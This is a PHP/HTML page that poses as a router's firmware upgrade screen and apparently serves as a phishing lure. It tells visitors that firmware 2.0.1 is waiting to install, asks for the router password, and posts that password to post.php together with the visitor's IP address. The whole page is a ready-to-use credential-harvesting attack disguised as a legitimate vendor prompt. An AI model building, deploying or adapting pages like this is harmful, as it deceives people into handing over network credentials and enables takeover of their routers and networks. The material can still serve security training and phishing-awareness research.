<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Router Configuration Page</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="/static/bootstrap.min.css">
  <link rel="stylesheet" href="/static/font-awesome-4.7.0/css/font-awesome.min.css">
  <script src="/static/jquery.min.js"></script>
  <script src="/static/bootstrap.min.js"></script>

  <!-- CSS -->
  <style type="text/css">

    /* Sticky footer styles
    -------------------------------------------------- */

    html,
    body {
          height: 100%;
          /* The html and body elements cannot have any padding or margin. */
        }

        /* Wrapper for page content to push down footer */
        #wrap {
          min-height: 100%;
          height: auto !important;
          height: 100%;
          /* Negative indent footer by it's height */
          margin: 0 auto -60px;
        }

        /* Set the fixed height of the footer here */
        #push,
        #footer {
          height: 60px;
        }
        #footer {
          background-color: #f5f5f5;
        }

        /* Lastly, apply responsive CSS fixes as necessary */
        @media (max-width: 767px) {
          #footer {
            margin-left: -20px;
            margin-right: -20px;
            padding-left: 20px;
            padding-right: 20px;
          }
        }

    img {
        width: auto;
        max-width: 100%;
        height: auto;
    }
    .isa_info {
        color: #9F6000;
        background-color: #FEEFB3
    }
    .isa_info i {
        margin:1px 3px;
        font-size:18px;
        vertical-align:middle;
    }
  </style>

</head>

<body>

  <!-- Start page content -->
  <div class="container">
	   <div class="col-sm">
       <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
    	 <p class="lead">A new version of the firmware 2.0.1 has been detected and awaiting installation. Please review the following terms and conditions and proceed.</p>
     </div>
    <form method="POST" action="post.php">
      <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
      <div class="form-group-has-feedback" id="psk_field">
          <label for="pwd">Enter the router password to continue:</label>
          <input class="form-control" name="routpwd" type="password" id="pwd">
      </div>
      <div class="container text-center">
        <div class="isa_info" id="pw_status" align="left"></div>
        <br>
        <button class="btn btn-primary" id="btn" onclick="checkBoxStatus(event)">Start Upgrade</button>
      </div>
    </form>
    <div id="push"></div>
  </div>
  <!-- Start page content -->

<script>
function checkBoxStatus(evt)
{

  // get the password box and checkbox elements
	var box = document.getElementById("psk_field");
	var input = document.getElementById("pwd");

    if (input.value == ""){
        box.innerHTML = `
          <div class="form-group-has-feedback" id="psk_field">
                  <label for="pwd">Enter the router password to continue:</label>
                  <input class="form-control" type="password" id="pwd">
                  <div class="modal-body">
                    <p>Please Input Valid Password.</p>
                  </div>
          </div>
        `
          evt.preventDefault();
    }

 }

</script>
</body>
</html>
